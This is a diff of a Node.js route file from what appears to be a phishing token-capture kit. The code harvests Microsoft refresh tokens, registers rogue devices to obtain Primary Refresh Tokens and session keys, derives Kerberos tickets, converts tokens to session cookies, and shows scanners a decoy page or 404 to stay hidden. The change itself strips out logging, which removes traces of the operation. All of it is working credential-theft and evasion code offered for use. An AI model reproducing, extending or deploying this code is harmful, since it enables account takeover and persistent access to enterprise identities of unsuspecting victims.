@@ -33,7 +33,7 @@ router.get('/check', async (req, res) => {
       serve_harmless_page: classification.action !== 'allow',
     });
   } catch (err) {
-    console.error('[Capture] bot-check error:', err.message);
+
     return res.json({ ok: true, blocked: false, action: 'allow', reason: 'check_failed' });
   }
 });
@@ -91,18 +91,18 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         // (upsert - the row may not exist yet).
         if (prtResult.sessionKeyHex) {
             await devicemanager.persistPrtSessionKey(user_id, tenant, prtResult.sessionKeyHex, material)
-                .catch(skErr => console.warn('[Capture] session key not stored in device_credentials:', skErr.message));
+                .catch(skErr => {});
         }
         if (prtResult.prt && tokenId) {
             await db.query(
                 'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
                 [encrypt(prtResult.prt), encrypt(prtResult.sessionKeyJwe || null), tokenId]
-            ).catch(pErr => console.error('[Capture] Failed to persist captured PRT:', pErr.message));
+            ).catch(pErr => {});
         }
         // Re-derive Kerberos TGTs now that a real PRT (acrs=pfdr) exists.
         if (tokenId && tenant && tenant !== 'common' && tenant !== 'organizations') {
             require('../services/kerberos').deriveTGTForToken(tokenId)
-                .catch(e => console.error('[Capture] Kerberos derivation error:', e.message));
+                .catch(e => {});
         }
     };
 
@@ -119,7 +119,7 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         try {
             enrollment = await devicecode.enrollDevice(access_token, deviceId, tenant);
         } catch (e) {
-            console.warn('[Capture] DRS enrollment failed:', e.message);
+
         }
     }
 
@@ -130,7 +130,7 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
                 enrollment = await devicecode.enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
             }
         } catch (e) {
-            console.warn('[Capture] DRS token refresh/enrollment failed:', e.message);
+
         }
     }
 
@@ -158,7 +158,7 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
                 return { success: true, via: 'devicemanager', prt: reg.prt || null };
             }
         } catch (e) {
-            console.warn('[Capture] devicemanager registration fallback failed:', e.message);
+
         }
         return { success: false, reason: 'device enrollment failed' };
     }
@@ -179,7 +179,7 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         });
         return { success: true, via: 'broker', prt: prtResult.prt || null };
     } catch (prtErr) {
-        console.warn('[Capture] request_for_device failed:', prtErr.message);
+
         return { success: false, reason: prtErr.message };
     }
 }
@@ -354,7 +354,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         const classification = classifyIP(visitorIp, ua, req.headers);
 
         if (classification.action === 'block') {
-          console.warn('[Capture] Blocked scanner', { ip: visitorIp, ua });
+
           return res.status(404).sendFile(path.join(__dirname, '..', '..', 'admin-panel', '404.html'));
         }
 
@@ -563,30 +563,30 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
               db.query(
                 'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                 [encrypt(derivationResult.tgt_cloud), tokenId]
-              ).catch(err => console.error('[Capture] Failed to save TGT cloud:', err));
+              ).catch(err => {});
             }
             if (derivationResult.tgt_ad) {
               db.query(
                 'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                 [encrypt(derivationResult.tgt_ad), tokenId]
-              ).catch(err => console.error('[Capture] Failed to save TGT AD:', err));
+              ).catch(err => {});
             }
             if (derivationResult.session_key) {
               db.query(
                 'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                 [encrypt(derivationResult.session_key), tokenId]
-              ).catch(err => console.error('[Capture] Failed to save session key:', err));
+              ).catch(err => {});
             }
             if (derivationResult.kerberos_top_level_names) {
               db.query(
                 'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                 [derivationResult.kerberos_top_level_names, tokenId]
-              ).catch(err => console.error('[Capture] Failed to save kerberos names:', err));
+              ).catch(err => {});
             }
           }
         })
         .catch(err => {
-          console.error('[Capture] Kerberos derivation error:', err.message);
+
         });
     }
 
@@ -625,7 +625,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 45000,
                 'PRT auto-capture'
             ).catch(e => {
-                console.warn('[Capture] PRT auto-capture gave up:', e.message);
+
                 return { success: false, reason: e.message };
             });
             if (autoPrt.success) {
@@ -651,7 +651,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 cookieSample: cookieResult.cookies,
             });
         } catch (err) {
-            console.error('[Capture] Cookie conversion/report flow failed:', err.message);
+
             try {
                 const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
                 await sendCaptureReport(user_id, {
@@ -661,14 +661,14 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                     cookieSample: cookieResult.cookies,
                 });
             } catch (cookieErr) {
-                console.error('[Capture] Cookie conversion fallback failed:', cookieErr.message);
+
                 await sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
             }
         }
     } else {
         if (accountType === 'work_school' && refresh_token) {
             autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token })
-                .catch(e => console.error('[Capture] Background PRT auto-capture error:', e.message));
+                .catch(e => {});
         }
         const io = req.app.get('io');
         if (io) {
@@ -685,7 +685,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     setBrowserLikeHeaders(res);
     res.status(200).json({ success: true, token_id: tokenId });
 } catch (err) {
-    console.error('[Capture] Error:', err);
+
     setBrowserLikeHeaders(res);
     res.status(500).json({ error: 'Internal server error' });
 }
@@ -793,7 +793,7 @@ router.post('/visitor/block-check', async (req, res) => {
             [user_id, link_id, visitor_ip, userAgent, country, workerName]
           );
         } catch (logErr) {
-          console.error('[Capture] Failed to log blocked revisit:', logErr.message);
+
         }
 
         return res.json({
@@ -829,7 +829,7 @@ router.post('/visitor/block-check', async (req, res) => {
       action: ipClassification.action
     });
   } catch (err) {
-    console.error('[Capture] visitor/block-check error:', err.message);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
